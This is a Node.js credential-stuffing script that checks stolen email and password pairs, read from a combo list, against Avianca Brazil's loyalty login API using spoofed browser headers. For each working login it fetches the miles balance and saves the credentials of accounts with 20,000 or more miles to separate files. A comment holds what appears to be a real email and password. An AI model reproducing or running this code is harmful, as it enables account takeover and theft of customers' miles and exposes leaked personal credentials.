var request = require('request');
var LineByLineReader = require('line-by-line');
var fs = require('fs');
var timer = 250;

lr = new LineByLineReader('disk11.txt');
lr.on('error', function (err) {
	// 'err' contains error object
});

lr.on('line', function (line) {
	try {
		var arr = line.split(";");
	
	  	if (arr[0].indexOf('@') > 1){
			testlogin(arr[0],arr[1]);
			lr.pause();
		}
		
		
		
	} catch (err)  {
		//console.log(err); 
	}  
	// ...do your asynchronous line processing..
	setTimeout(function () {

		// ...and continue emitting lines.
		lr.resume();
	}, timer);
});

lr.on('end', function () {
	// All lines are read, file is closed now.
});





//testlogin("marcelo_tuba00@hotmail.com","23032011")

function testlogin(email,password) {
	// Set the headers
	var headers = {
		'User-Agent':       'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36',
		'Host':     'www.avianca.com.br',
		'Referer':     'https://www.avianca.com.br/login-avianca',
		'Accept':     'application/json, text/javascript, */*; q=0.01',
		'Accept-Encoding':     'gzip, deflate, br',
		'Accept-Language':     'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		'Content-Type':     'application/json'
	}

	// Configure the request
	var options = {
		url: 'https://www.avianca.com.br/api/jsonws/aviancaservice.tokenasl/get-customer-token',
		method: 'POST',
		headers: headers,
		form: 'clientUsername=' + email + '&documentNumber=&flyerId=&clientPassword=' + password + '&userType=customer'
	}
	//form: 'clientUsername=&documentNumber=' + email + '&flyerId=&clientPassword=' + password + '&userType=customer'
	// Start the request
	request(options, function (error, response, body) {
		if (!error && response.statusCode == 200) {
			// Print out the response body
			try {
				var teste = JSON.parse(body)
				if (teste.error == 'bad_credentials') {
					console.log('Error:' + email + ':' + password + ' - ' + teste.errorDescription);
				} else {
					getbalance(email,password,teste.accessToken);
				}
			} catch (err)  {
				console.log(err); 
			}
		}
	})
}

function getbalance(email,password,AccessToken) {
	// Set the headers
		var headers = {
			'User-Agent':       'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36',
			'Referer':     'https://www.avianca.com.br/pt/meus-pontos',
			'Accept':     '*/*',
			'Accept-Encoding':     'gzip, deflate, br',
			'Accept-Language':     'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
			'Content-Type':     'application/json'
		}

		// Configure the request
		var options = {
			url: 'https://api.avianca.com.br/customeraccount/customerbasic/loyalty/tierpoints/checkbalance/retrieve?access_token='+ AccessToken,
			method: 'GET',
			headers: headers
		}
		// Start the request
		request(options, function (error, response, body) {
			if (!error && response.statusCode == 200) {
				// Print out the response body
				var teste = JSON.parse(body)
				if (teste.returnMessage == 'Successful response') {
					
					console.log('Good:' + email  + ':' + password  + ' - ' +  'Milhas: ' + teste.payload.totalMiles);
					//SalvaRetorno(email  + ':' + password  + ':' +  teste.payload.totalMiles + '\r\n','bons_')
					if (teste.payload.totalMiles >= 20000) {
						SalvaRetorno(email  + ':' + password  + ':' +  teste.payload.totalMiles + '\r\n',abbreviateNumber(teste.payload.totalMiles))
					}
				}
				
			}
		})

}

function SalvaRetorno(url,caminho) {
	try {
		
		var logger = fs.createWriteStream('retorno_' + caminho + '.txt', {
			flags: 'a' // 'a' means appending (old data will be preserved)
		});

		logger.write(url)
		logger.end()
	} catch (err)  {
		//console.log(err); 
	}
}

function abbreviateNumber(value) {
	var newValue = value;
	if (value >= 1000) {
		var suffixes = ["", "k", "m", "b","t"];
		var suffixNum = Math.floor( (""+value).length/3 );
		var shortValue = '';
		for (var precision = 1; precision >= 1; precision--) {
			shortValue = parseFloat( (suffixNum != 0 ? (value / Math.pow(1000,suffixNum) ) : value).toPrecision(precision));
			var dotLessShortValue = (shortValue + '').replace(/[^a-zA-Z 0-9]+/g,'');
			if (dotLessShortValue.length <= 2) { break; }
		}
		if (shortValue % 1 != 0)  shortNum = shortValue.toFixed(1);
		newValue = shortValue;
	}
	return newValue;
}
